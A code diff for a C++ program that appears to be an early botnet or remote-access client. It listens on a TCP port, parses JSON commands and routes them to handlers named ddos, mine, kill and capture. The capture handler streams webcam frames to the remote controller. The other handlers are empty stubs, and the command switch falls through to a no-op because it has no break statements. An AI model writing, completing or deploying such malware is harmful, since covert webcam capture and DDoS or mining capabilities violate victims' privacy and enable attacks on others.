@@ -4,25 +4,27 @@
 #include <unistd.h>
 #include <vector>
 #include <thread>
+#include </opt/homebrew/Cellar/jsoncpp/1.9.5/include/json/json.h>
 #define PORT 12000
 #define BUFFER_SIZE 1024
 
-int capture(int* socket) {
+void capture(Json::Value* root, int* sock) {
+    const int* socket = sock;
     char response_buffer[BUFFER_SIZE];
     cv::VideoCapture cap(0);
     cv::Mat frame;
     std::vector<uchar> buffer;
-    std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, 80};
+    const std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, 80};
 
     while (true) {
         cap >> frame;
         cv::imencode(".jpg", frame, buffer, params);
         unsigned long frame_size = buffer.size();
         if (send(*socket, &frame_size, sizeof(frame_size), 0) < 0) {
-            return -1;
+            break;
         }
         if (send(*socket, buffer.data(), frame_size, 0) < 0) {
-            return -1;
+            break;
         }
         recv(*socket, &response_buffer, BUFFER_SIZE, 0);
         if (response_buffer == "disconnect") {
@@ -33,54 +35,78 @@ int capture(int* socket) {
     cap.release();
 }
 
-struct hash {
-    const char* key;
-    void (*value);
+void ddos(Json::Value* root, int* sock) {}
+void kill(Json::Value* root, int* sock) {}
+void mine(Json::Value* root, int* sock) {}
+void idle(Json::Value* root, int* sock) {}
+
+[[noreturn]] void dummy(Json::Value* root, int* sock) {}
+
+struct function {
+    void (*func)(Json::Value*, int*);
 };
 
-struct hash2 {
-    const char* key;
-    void (*value)(const char* ip);
-};
+struct function manage_request(const char* request) {
+    const char re = request[0];
+    struct function result;
+    switch (re) {
+        //ddos
+        case 'd':
+            result.func = &ddos;
+        //camera
+        case 'c':
+            result.func = &capture;
+        //mine
+        case 'm':
+            result.func = &mine;
+        //idle
+        case 'i':
+            result.func = &idle;
+        //kill
+        case 'k':
+            result.func = &kill;
+        default:
+            result.func = &dummy;
+    }
+    return result;
+}
 
-struct hash3 {
-    const char* key;
-    int (*value)(int* socket);
-};
+Json::Value parse_request(const char* request) {
+    Json::Value root;
+    Json::Reader reader;
+    const bool parsed = reader.parse(request, root);
+    if (!parsed) {
+        std::cout << "failed" << std::endl;
+    }
+    return root;
+}
 
-struct functions {
-    struct hash2 ddos;
-    struct hash miner;
-    struct hash3 camera;
-    struct hash idle;
-    struct hash kill;
-    struct hash rterminal;
-};
-
-int main() {
-    struct functions funcs {
-
-    };
-
-    int socket;
-    struct sockaddr_in address;
+[[noreturn]] int main() {
+    struct sockaddr_in address{};
     int addrlen = sizeof(address);
-    int opt = 1;
     int server_fd = socket(AF_INET, SOCK_STREAM, 0);
 
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = INADDR_ANY;
     address.sin_port = htons(PORT);
 
-    int bind_success = bind(server_fd, (struct sockaddr*)&address, addrlen);
-    int listen_success = listen(server_fd, 10);
-    socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
+    if (bind(server_fd, reinterpret_cast<struct sockaddr *>(&address), addrlen) > 0) {
+        // ReSharper disable once CppDFAInfiniteRecursion
+        main();
+    }
+    if (listen(server_fd, 10) > 0) {
+        // ReSharper disable once CppDFAInfiniteRecursion
+        main();
+    }
+    server_fd = accept(server_fd, reinterpret_cast<struct sockaddr *>(&address), reinterpret_cast<socklen_t *>(&addrlen));
 
     while (true) {
         char buffer[BUFFER_SIZE];
-        recv(socket, &buffer, sizeof(buffer), 0);
+        recv(server_fd, &buffer, sizeof(buffer), 0);
         if (strlen(buffer) > 0) {
-
+            Json::Value root = parse_request(buffer);
+            const struct function func = manage_request(root["request"].asCString());
+            func.func(&root, &server_fd);
         }
     }
 }
